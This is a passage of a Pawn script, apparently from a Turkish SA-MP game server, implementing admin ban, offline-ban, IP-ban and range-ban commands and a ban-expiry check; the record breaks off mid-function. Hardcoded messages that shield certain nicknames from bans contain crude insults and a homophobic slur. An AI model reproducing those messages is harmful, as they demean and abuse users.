					if(!strcmp("MaWixXx", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
					if(!strcmp("Ghostevil", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "Boþ");
				    if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'yi sýnýrsýz banladý {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), Reason);
					SendClientMessageToAll(0x808080FF, Yazi);
					new Yazi2[1024];
					format(Yazi2, 1000, "~r~~h~ADMIN %s %s ~w~'yI sInIrsIz banladI ~r~~h~( %s )", GetName(playerid), GetName(PlayerToBan), Reason);
					SendDuyuruText(Yazi2);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Reason);
					format(Yazi, 1000, "%s{DDDDDD}Süre: {48D1CC}Sýnýrsýz\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}Yok\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");

					new handle = SQL::Open(SQL::INSERT, "yasaklilar");
    				SQL::WriteString(handle, "Nick", GetName(PlayerToBan));
    				SQL::WriteString(handle, "Banlayan", GetName(playerid));
    				SQL::WriteString(handle, "Sebep", Reason);
    				SQL::WriteInt(handle, "Sonlu", 0);
    				SQL::WriteInt(handle, "BitisGun", 0);
    				SQL::WriteInt(handle, "BitisAy", 0);
    				SQL::WriteInt(handle, "BitisYil", 0);
    				SQL::WriteInt(handle, "BitisSaat", 0);
    				SQL::WriteInt(handle, "BitisDakika", 0);
   					SQL::Close(handle);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i sinirsiz banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					LOG(Yazi);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i sinirsiz banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s sýnýrsýz banlandý Sebep: %s.", GetName(PlayerToBan), Reason);
					SqlLogYaz(playerid, 1, Yazi);

					SafeKick(PlayerToBan);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /ban2 ( Offline Ban )
CMD:ban2(playerid, params[])
{
	new PlayerToBan[24], Sure, Reason[128], Yazi[1000];

	SendAdminText(playerid, "/ban2", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]is[128]", PlayerToBan, Sure, Reason))
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/ban2 {FFC000}[ Nick ][ Süre(Gün) ][ Sebep ]");
			else
			{
				if(!strcmp("Ghostevil", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
       			if(!strcmp("NicqsiZAcent", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
				if(!strcmp("Tiger", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
				if(!strcmp("TeaMStar", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}boþ");
    			if(!SQL::RowExistsEx("oyuncular", "Nick", PlayerToBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu isimle kayýt olan bir oyuncu yok!");
				if(SQL::RowExistsEx("yasaklilar", "Nick", PlayerToBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu kiþi zaten yasaklýlar listesinde!");
				new ID = GetPlayerID(PlayerToBan);
				if(ID != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyundaki birine Offline Ban atamazsýnýz!");

				new day, month, year, hour, minute, second;
				getdate(year, month, day);
				gettime(hour, minute, second);
				#pragma unused second
				day += Sure;
				AyKontrol(day, month, year);

				format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'yi %i gün offline banladý {FF0000}[ %s ]", GetName(playerid), PlayerToBan, Sure, Reason);
				SendClientMessageToAll(0x808080FF, Yazi);

				new handle = SQL::Open(SQL::INSERT, "yasaklilar");
				SQL::WriteString(handle, "Nick", PlayerToBan);
				SQL::WriteString(handle, "Banlayan", GetName(playerid));
				SQL::WriteString(handle, "Sebep", Reason);
				SQL::WriteInt(handle, "Sonlu", 1);
				SQL::WriteInt(handle, "BitisGun", day);
				SQL::WriteInt(handle, "BitisAy", month);
				SQL::WriteInt(handle, "BitisYil", year);
				SQL::WriteInt(handle, "BitisSaat", hour);
				SQL::WriteInt(handle, "BitisDakika", minute);
				SQL::Close(handle);

				format(Yazi, 1000, "[OBAN] %s(%d) %s'i %d gün offline banladi. Sebep: %s", GetName(playerid), playerid, PlayerToBan, Sure, Reason);
				LOG(Yazi);

				format(Yazi, 1000, "[OBAN] %s(%d) %s'i %d gün offline banladi. Sebep: %s", GetName(playerid), playerid, PlayerToBan, Sure, Reason);
				BANLOG(Yazi);
				new Yazs[1024];
				format(Yazs, 1000, "%s Offline Banlandi: %d gün Sebep: %s.", PlayerToBan, Sure, Reason);
				SqlLogYaz(playerid, 1, Yazs);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /sban2 ( Offline Ban )
CMD:sban2(playerid, params[])
{
	new PlayerToBan[24], Reason[128], Yazi[1000];

	SendAdminText(playerid, "/sban2", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]s[128]", PlayerToBan, Reason))
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/sban2 {FFC000}[ Nick ][ Sebep ]");
			else
			{
				if(!strcmp("NicqsiZAcent", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
       			if(!strcmp("NicqsiZAcent", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
				if(!strcmp("Tiger", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
				if(!strcmp("TeaMStar", PlayerToBan, true)) return SendClientMessage(playerid, -1, "{FF0000}Sunucu Saybini Banlayamazsýn.");

				if(!SQL::RowExistsEx("oyuncular", "Nick", PlayerToBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu isimle kayýt olan bir oyuncu yok!");
				if(SQL::RowExistsEx("yasaklilar", "Nick", PlayerToBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu kiþi zaten yasaklýlar listesinde!");
				new ID = GetPlayerID(PlayerToBan);
				if(ID != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyundaki birine Offline Ban atamazsýnýz!");
				format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'yi sýnýrsýz offline banladý {FF0000}[ %s ]", GetName(playerid), PlayerToBan, Reason);
				SendClientMessageToAll(0x808080FF, Yazi);

				new handle = SQL::Open(SQL::INSERT, "yasaklilar");
				SQL::WriteString(handle, "Nick", PlayerToBan);
				SQL::WriteString(handle, "Banlayan", GetName(playerid));
				SQL::WriteString(handle, "Sebep", Reason);
				SQL::WriteInt(handle, "Sonlu", 0);
				SQL::WriteInt(handle, "BitisGun", 0);
				SQL::WriteInt(handle, "BitisAy", 0);
				SQL::WriteInt(handle, "BitisYil", 0);
				SQL::WriteInt(handle, "BitisSaat", 0);
				SQL::WriteInt(handle, "BitisDakika", 0);
				SQL::Close(handle);

				format(Yazi, 1000, "[OBAN] %s(%d) %s'i sinirsiz offline banladi. Sebep: %s", GetName(playerid), playerid, PlayerToBan, Reason);
				LOG(Yazi);

				format(Yazi, 1000, "[OBAN] %s(%d) %s'i sinirsiz offline banladi. Sebep: %s", GetName(playerid), playerid, PlayerToBan, Reason);
				BANLOG(Yazi);
				format(Yazi, 1000, "%s Sýnýrsýz Offline Banlandi: Sebep: %s.", PlayerToBan,  Reason);
				SqlLogYaz(playerid, 1, Yazi);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /unban
CMD:unban(playerid, params[])
{
	if(APlayerData[playerid][LoggedIn] == false) return 0;
	if(APlayerData[playerid][PlayerLevel] < 6 && Root[playerid] == 0) return 0;
	new AcilacakBan[30];
	if (sscanf(params, "s[30]", AcilacakBan)) return SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/unban {FFC000}[ Oyuncu Nick ]");
    if(!SQL::RowExistsEx("yasaklilar", "Nick", AcilacakBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu kiþi yasaklýlar listesinde yok!");

	new Yazi[300];
	format(Yazi, 300, "{FF0000}ADMIN %s, %s{F8F8FF}'in yasaðýný kaldýrdý.", GetName(playerid), AcilacakBan);
	SendClientMessageToAll(-1, Yazi);

	UnBan(AcilacakBan);
	return 1;
}

// /bangor
CMD:bangor(playerid, params[])
{
	if(APlayerData[playerid][LoggedIn] == false) return 0;
	if(APlayerData[playerid][PlayerLevel] < 2 && Root[playerid] == 0) return 0;
	new AcilacakBan[30];
	if (sscanf(params, "s[30]", AcilacakBan)) return SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/bangor {FFC000}[ Oyuncu Nick ]");
    if(!SQL::RowExistsEx("yasaklilar", "Nick", AcilacakBan)) return SendClientMessage(playerid, -1, "{FF0000}Bu kiþi yasaklýlar listesinde yok!");

	new Yazi[1000], Banlayan[31], Sebep[200], Sonlu, Gun, Ay, Yil, Saat, Dakika;
	new handle = SQL::OpenEx(SQL::READ, "yasaklilar", "Nick", AcilacakBan);
	SQL::ReadString(handle, "Banlayan", Banlayan, 31);
	SQL::ReadString(handle, "Sebep", Sebep, 200);
	SQL::ReadInt(handle, "Sonlu", Sonlu);
	SQL::ReadInt(handle, "BitisGun", Gun);
	SQL::ReadInt(handle, "BitisAy", Ay);
	SQL::ReadInt(handle, "BitisYil", Yil);
	SQL::ReadInt(handle, "BitisSaat", Saat);
	SQL::ReadInt(handle, "BitisDakika", Dakika);
	SQL::Close(handle);

	if(Sonlu == 1)
	{
		format(Yazi, 1000, "{FF4040}%s'nin Yasaklanma Bilgileri\n", Yazi, AcilacakBan);
		format(Yazi, 1000, "%s\n", Yazi);
		format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
		format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
		format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");
	}else{
		format(Yazi, 1000, "{FF4040}%s'nin Yasaklanma Bilgileri\n", Yazi, AcilacakBan);
		format(Yazi, 1000, "%s\n", Yazi);
		format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
		format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
		format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}Yok\n", Yazi);
		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");
	}
	return 1;
}

/*

*/
// /ipban
CMD:ipban(playerid, params[])
{
	new PlayerToBan, Reason[128], Yazi[1000];

	SendAdminText(playerid, "/ipban", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToBan, Reason))
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/ipban {FFC000}[ Oyuncu ID/Nick ][ Sebep ]");
			else
			{
				if (IsPlayerConnected(PlayerToBan))
				{
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
                    if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Sunucu Saybini Banlayamazsýn.");
					if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'e IP Ban attý. {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), Reason);
					SendClientMessageToAll(0x808080FF, Yazi);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Reason);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklanma Türü: {48D1CC}IP Adresi Yasaklanmasý\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");

					format(Yazi, 1000, "[IPBAN] %s(%d) %s(%d)'e IP BAN attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					LOG(Yazi);

					format(Yazi, 1000, "[IPBAN] %s(%d) %s(%d)'e IP BAN attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s IP Banlandi: Sebep: %s.", GetName(PlayerToBan), Reason);
					SqlLogYaz(playerid, 1, Yazi);

					SafeBanEx(PlayerToBan, Reason);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /rban
CMD:rban(playerid, params[])
{
	new PlayerToBan, PlayerIP[16], FirstPartsOfIP[16], BanCmd[24], Reason[128], Yazi[1000];

	SendAdminText(playerid, "/rban", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToBan, Reason))
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/rban {FFC000}[ Oyuncu ID/Nick ][ Sebep ]");
			else
			{
				if (IsPlayerConnected(PlayerToBan))
				{
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
					if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Sunucu Saybini Banlayamazsýn.");
	    			if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'e Range Ban attý. {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), Reason);
					SendClientMessageToAll(0x808080FF, Yazi);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Reason);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklanma Türü: {48D1CC}IP Range Yasaklanmasý\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");

					format(Yazi, 1000, "[RANGEBAN] %s(%d) %s(%d)'e RANGE BAN attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					LOG(Yazi);

					format(Yazi, 1000, "[RANGEBAN] %s(%d) %s(%d)'e RANGE BAN attý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Reason);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s Range Banlandi: Sebep: %s.", GetName(PlayerToBan), Reason);
					SqlLogYaz(playerid, 1, Yazi);

					GetPlayerIp(PlayerToBan, PlayerIP, 16);
					FirstPartsOfIP = GetFirstThreeDigitsFromIP(PlayerIP);
					for (new i; i < 256; i++)
					{
					    format(BanCmd, 24, "banip %s%i", FirstPartsOfIP, i);
                        SendRconCommand(BanCmd);
					}
					SafeKick(PlayerToBan);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// BanControl
BanControl(playerid)
{
    if(SQL::RowExistsEx("yasaklilar", "Nick", GetName(playerid)))
    {
        new Yazi[1000], Banlayan[31], Sebep[200], Sonlu, Gun, Ay, Yil, Saat, Dakika;
  		new handle = SQL::OpenEx(SQL::READ, "yasaklilar", "Nick", GetName(playerid));
   		SQL::ReadString(handle, "Banlayan", Banlayan, 31);
   		SQL::ReadString(handle, "Sebep", Sebep, 200);
   		SQL::ReadInt(handle, "Sonlu", Sonlu);
   		SQL::ReadInt(handle, "BitisGun", Gun);
   		SQL::ReadInt(handle, "BitisAy", Ay);
   		SQL::ReadInt(handle, "BitisYil", Yil);
   		SQL::ReadInt(handle, "BitisSaat", Saat);
   		SQL::ReadInt(handle, "BitisDakika", Dakika);
   		SQL::Close(handle);

		if(Sonlu == 1)
		{
			new year, month, day, hour, minute, second;
			getdate(year, month, day);
			gettime(hour, minute, second);
			#pragma unused second
			if(year > Yil)
			{
			    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hesabýnýzýn yasaklanma süresi bitmiþtir. Ýyi oyunlar!");
			    UnBan(GetName(playerid));
			    return 0;
			}else if(year == Yil)
			{
			    if(month > Ay)
			    {
  			    	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hesabýnýzýn yasaklanma süresi bitmiþtir. Ýyi oyunlar!");
			    	UnBan(GetName(playerid));
			    	return 0;
				}else if(month == Ay)
				{
				    if(day > Gun)
				    {
   			   		 	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hesabýnýzýn yasaklanma süresi bitmiþtir. Ýyi oyunlar!");
			    		UnBan(GetName(playerid));
			    		return 0;
				    }else if(day == Gun)
					{
						if(hour > Saat)
						{
	   			   		 	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hesabýnýzýn yasaklanma süresi bitmiþtir. Ýyi oyunlar!");
				    		UnBan(GetName(playerid));
				    		return 0;
						}else if(hour == Saat)
						{
							if(minute >= Dakika)
							{
         			   		 	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Hesabýnýzýn yasaklanma süresi bitmiþtir. Ýyi oyunlar!");
					    		UnBan(GetName(playerid));
					    		return 0;
							}else{
								format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
								format(Yazi, 1000, "%s\n", Yazi);
								format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
								format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
								format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
								format(Yazi, 1000, "%s\n", Yazi);
								format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
								format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
								format(Yazi, 1000, "%s\n", Yazi);
		    					format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
		    					ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

		    					//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
		    					//SendClientMessageToAll(-1, Yazi);
								CikisYazdir[playerid] = false;
								
		    					SafeKick(playerid);
		    					return 1;
							}
						}else{
							format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
							format(Yazi, 1000, "%s\n", Yazi);
							format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
							format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
							format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
							format(Yazi, 1000, "%s\n", Yazi);
							format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
							format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
							format(Yazi, 1000, "%s\n", Yazi);
	    					format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
	    					ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

	    					//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
	    					//SendClientMessageToAll(-1, Yazi);
							CikisYazdir[playerid] = false;
								
	    					SafeKick(playerid);
	    					return 1;
						}
				    }else{
						format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
						format(Yazi, 1000, "%s\n", Yazi);
						format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
						format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
						format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
						format(Yazi, 1000, "%s\n", Yazi);
						format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
						format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
						format(Yazi, 1000, "%s\n", Yazi);
 						format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
 						ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

						//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
 						//SendClientMessageToAll(-1, Yazi);
 						CikisYazdir[playerid] = false;

						SafeKick(playerid);
 						return 1;
				    }
				}else{
					format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

    				//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
    				//SendClientMessageToAll(-1, Yazi);
    				CikisYazdir[playerid] = false;

    				SafeKick(playerid);
    				return 1;
				}
			}else{
				format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
				format(Yazi, 1000, "%s\n", Yazi);
				format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
				format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
				format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, Gun, Ay, Yil, Saat, Dakika);
				format(Yazi, 1000, "%s\n", Yazi);
				format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
				format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
				format(Yazi, 1000, "%s\n", Yazi);
    			format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    			ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

    			//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
    			//SendClientMessageToAll(-1, Yazi);
    			CikisYazdir[playerid] = false;

    			SafeKick(playerid);
    			return 1;
			}
		}else{
			format(Yazi, 1000, "{FF4040}==============[OYUNDAN YASAKLISINIZ]=============\n", Yazi);
			format(Yazi, 1000, "%s\n", Yazi);
			format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, Banlayan);
